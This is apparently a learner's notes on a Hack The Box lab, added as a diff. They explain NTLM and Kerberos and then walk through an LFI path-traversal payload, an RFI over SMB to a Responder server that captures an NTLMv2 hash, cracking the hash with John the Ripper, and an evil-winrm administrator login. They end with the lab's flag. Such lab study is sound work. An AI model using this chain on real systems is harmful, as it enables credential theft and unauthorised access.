@@ -1,0 +1,239 @@
+The introduction talks about Windows being currently the most predominant OS.
+
+Windows uses New Technology LAN Manager (NTLM) and Kerberos for authentication services.
+
+High-level explanation of NTLM and Kerberos:
+https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/ntlm-user-authentication?source=recommendations
+https://www.xcitium.com/ntlm-explained/
+https://www.crowdstrike.com/cybersecurity-101/ntlm-windows-new-technology-lan-manager/
+https://www.simplilearn.com/what-is-kerberos-article
+https://www.youtube.com/watch?v=5N242XcKAsM
+
+NTLM is a suite of authentication protocols by Microsoft.
+
+NTLM enables mutual authentication between servers and clients.
+
+Steps:
+1. Client has to be authenticated by providing it with a username and password
+2. If it matches, the server can check access rights and allow the user entry
+
+How authentication works: challenge-response protocol
+1. Client sends its username to host or server
+2. Host responds with a random number (the challenge)
+3. Client generates a hashed password value with this random number (nonce?) and sends
+back as response
+4. The host, the server, will act as a middle-man. Here, it will just pass on the
+username, password and nonce to the Domain Controller (DC).
+5. DC will check the encrypted challenge and client response.
+If it matches, user is then authenticated
+
+Here, the weakness is that passwords stored on the server are not salted.
+Hence vulnerable to brute-force attacks.
+Also uses outdated cryptographic hash functions for encryption.
+
+After observing these weaknesses, Microsoft released Kerberos.
+
+Kerberos:
+There is a third-party apart from client and server: a Key Distribution Center (KDC)
+
+In between the client and the resources the client wishes to access is the KDC.
+
+The KDC:
+1. Contains Ticket Granting Server. Generates one-time tickets.
+This ticket is called a Ticket-Granting Ticket (TGT)
+This server confirms that a known user is making an access request to a known service.
+This ticket is used for requesting service tickets for various resources without
+repeatedly asking for credentials.
+2. Contains Authentication Server. This server confirms a known user is making an access
+request and issues TGT.
+
+Workflow:
+1. Client requests for TGT from Authentication Server. Includes client ID.
+2. The Authentication Server verifies the client: it checks the database for the client
+and Ticket Granting Server's availability. If both exists, it generates a client/user secret key
+using the client's password hash. It sends to client
+3. The client decrypts the message with their secret key. It then creates a couple of new
+messages, then sends it to the Ticket Granting Server.
+4. The Ticket Granting Server then decrypts the TGT, performs validation, then generates a service
+ticket.
+5. The service ticket along with another message is sent back to the user.
+6. The user decrypts the message, creates an authenticator message, and sends this message
+with the service ticket to the resource server (service).
+7. The resource server will do its own decryption, validation and create its own final authenticator
+message.
+8. This final message is sent back to the user.
+9. All of these messages allow the user and the server to mutually authenticate each other.
+
+Now the client, KDC and resource server can communicate safely.
+
+The main goal of Kerberos is that all authentication information is done via a centralised server.
+
+Back to the labs:
+It focuses on File Inclusion vulnerability on a webpage:
+https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
+
+The idea is to upload a file that plays with the resource directory path on the server, then tricking the server
+to display other files residing in the server.
+
+First step is enumeration:
+nmap -p- --min-rate 1000 -sV <virtual machine>
+This time,
+-p- : scan for all TCP ports from 0 to 65535
+--min-rate 1000 : specify the minimum number of packets nmap sends per second. More means faster.
+
+The labs gives a bit of explanation behind port scanning:
+nmap actually uses a database: port-services database of well-known services to determine which service
+is running on a port. Then it sends service-related requests to the port to determine more information regarding it.
+So it can be not always accurate.
+
+We get the following results:
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+On port 5985, it is mentioned that the service is Windows Remote Management (WinRM)
+WinRM allows interactions:
+1. Remotely communicate and interface with hosts
+2. Execute commands remotely on systems that are not local to you but are network accessible.
+3. Monitor, manage and configure servers, operating systems and client machines from a remote location.
+
+A user with such rights => if we can get his credentials, we can do a lot of things on the machine.
+
+In the example, opening the webpage with url: http:<target ip> throws an error: it cannot be reached.
+When we re-see the URL bar, we see: http://unika.htb
+This is explained to be Name-Based Virtual.
+It is a method for hosting multiple domain names (with separate handling of each name) on a single server.
+This allows one server to share its resources, such as memory and processor cycles, without requiring 
+all the services to be used by the same hostname.
+
+In the web server of the virtual machine: it checks the domain name in the Host header field of the HTTP
+request and sends a response according to that. Currently, our browser does not send that.
+
+The reason why we cannot see the website is because our machine does not know how to find "unika.htb".
+We need to somehow "tell" it:
+
+In our local machine, /etc/hosts file contains the mapping: hostname to IP address.
+We can add an entry here:
+echo "<ip address> unika.htb" | sudo tee -a /etc/host
+
+Now, the browser knows resolve the hostname to the ip address.
+More importantly, the browser now adds "Host: unika.htb" in its request.
+
+Opening firefox via WSL and entering the ip address, we see the homepage.
+
+We can change the language of the page from english to french.
+
+The address bar now shows: http://unika.htb/index.php?page=french.html
+
+In this exercise, the author points out that when you see a .html file with a page parameter, it could be a significance
+that the address bar is not sanitised. This means that it may be susceptible to a Local File Inclusion (LFI) vulnerability.
+
+More information on LFI:
+The goal here is to check if unsanitised. If it is, you can view sensitive files in the system, and or
+potentially even run code.
+
+There is RFI too:
+RFI is like LFI but attacker uploads files onto the server using protocols like HTTP, FTP.
+
+The approach, from this point, is suggested to look at common Windows files.
+
+In the exercise:
+"
+One of the most common files that a penetration tester
+might attempt to access on a Windows machine to verify LFI is the hosts file,
+WINDOWS\System32\drivers\etc\hosts (this file aids in the local translation of host names to IP
+addresses). The ../ string is used to traverse back a directory, one at a time. Thus multiple ../ strings are
+included in the URL so that the file handler on the server traverses back to the base directory i.e. C:\ .
+"
+The idea is to traverse through the directory of the server to access unauthorised files.
+
+We can do so by replace the page parameter in the address bar with value:
+../../../../../../../../windows/system32/drivers/etc/hosts
+
+Doing so, the website shows contents of the hosts file:
+"
+# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+# # This file contains the mappings of IP addresses to host names.
+Each # entry should be kept on an individual line.
+The IP address should # be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one # space.
+# # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name 
+denoted by a '#' symbol. # #
+For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost
+name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost 
+"
+
+So the value we used was just an example:
+../../../../../../../../windows/system32/drivers/etc/hosts
+
+and there are many more; depends on what system files you want to find.
+A GitHub repository has a list:
+https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
+
+
+For the case of RFI (not in this exercise), we would do of the form:
+page=//<your machine ip address>/yourFile
+
+and you can exploit an RFI on the website.
+
+Then the challenge explains NTLM:
+
+Ideas not captured above:
+
+An NTHash is the output of the algorithm used to store passwords on Windows systems in the SAM
+database and on domain controllers. An NTHash is often referred to as an NTLM hash or even just an
+NTLM, which is very misleading / confusing.
+
+Here, we note that for PHP.ini configuration file, the "allow_url_include" wrapper is "off" by
+default.
+
+This means that PHP does not load remote HTTP or FTP URLs.
+
+However, PHP does not prevent loading of SMB URLs.
+So the next step in this exercise is to set up a malicious SMB server on our end.
+Then make the PHP server authenticate with it via NTLM:
+
+1. Responder will send back a challenge to the PHP server to encrypt its password
+2. When the PHP server responds, Responder will take it to generate the NetNTLMv2.
+This is just a revised version of the original version.
+3. We will then brute-force the NetNTLMv2 hashes. This is called Hash Cracking.
+
+There are a few tools for this: John The Ripper is a popular tool.
+
+Responder is the tool to set up the malicious SMB server.
+
+We git clone the repository and access its configuration: Responder.conf
+Here, we observe and ensure that SMB = On.
+Next, we can run it via:
+
+sudo python3 Responder.py -I tun0
+
+tun0 is the VPN interface: OpenVPN is being used here for HTB.
+-I is to specify the network interface
+
+So this executes a the Responder.py Python script with inputs: interface 
+on which the script should listen on for network traffic.
+
+Here, we use tun0. So the script will listen for traffic on this VPN interface.
+Then, it will intercept the traffic.
+
+Now, we can perform RFI:
+
+http://unika.htb/index.php?page=//<Responder IP address>/anything
+
+We get the hash.
+
+Next we run John the Ripper on the hash => it will encrypt words from a word list
+and compare it with the hash.
+
+We get badminton as the password.
+
+The last step is to connect to the Windows Remote Management service.
+We use a tool Evil-WinRM to interact with the service.
+
+evil-winrm -i <virtual machine ip address> -u administrator and -p badminton,
+we can log into the service.
+
+then listing the directory, we can see the flag:
+ea81b7afddd03efaa0945333ed147fac
